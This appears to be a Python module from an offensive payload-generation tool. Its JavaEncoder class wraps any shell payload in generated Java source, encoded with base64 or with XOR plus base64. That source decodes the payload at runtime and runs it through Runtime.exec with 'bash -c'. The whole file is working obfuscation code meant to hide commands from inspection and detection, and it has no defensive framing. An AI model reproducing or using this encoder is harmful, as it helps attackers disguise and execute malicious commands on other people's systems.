import base64
from .base_encoder import BaseEncoder

class JavaEncoder(BaseEncoder):
    """Java specific encoder"""
    
    def encode(self, payload: str, method: str) -> str:
        if method == "base64":
            return self._base64_wrapper(payload)
        elif method == "xor":
            return self._xor_wrapper(payload)
        else:
            return payload
    
    def _base64_wrapper(self, payload: str) -> str:
        """Base64 encode Java payload"""
        encoded = base64.b64encode(payload.encode()).decode()
        return f"""
import java.util.Base64;

public class EncodedPayload {{
    public static void main(String[] args) throws Exception {{
        String encoded = "{encoded}";
        byte[] decodedBytes = Base64.getDecoder().decode(encoded);
        String decoded = new String(decodedBytes);
        
        Runtime.getRuntime().exec(new String[]{{"bash", "-c", decoded}});
    }}
}}
"""
    
    def _xor_wrapper(self, payload: str, key: str = "0xD4") -> str:
        """XOR encode Java payload"""
        encoded = []
        for i, c in enumerate(payload):
            encoded.append(ord(c) ^ ord(key[i % len(key)]))
        encoded_bytes = bytes(encoded)
        encoded_str = base64.b64encode(encoded_bytes).decode()
        
        return f"""
import java.util.Base64;

public class EncodedPayload {{
    public static void main(String[] args) throws Exception {{
        String key = "{key}";
        byte[] encoded = Base64.getDecoder().decode("{encoded_str}");
        StringBuilder decoded = new StringBuilder();
        
        for (int i = 0; i < encoded.length; i++) {{
            decoded.append((char)(encoded[i] ^ key.charAt(i % key.length())));
        }}
        
        Runtime.getRuntime().exec(new String[]{{"bash", "-c", decoded.toString()}});
    }}
}}
"""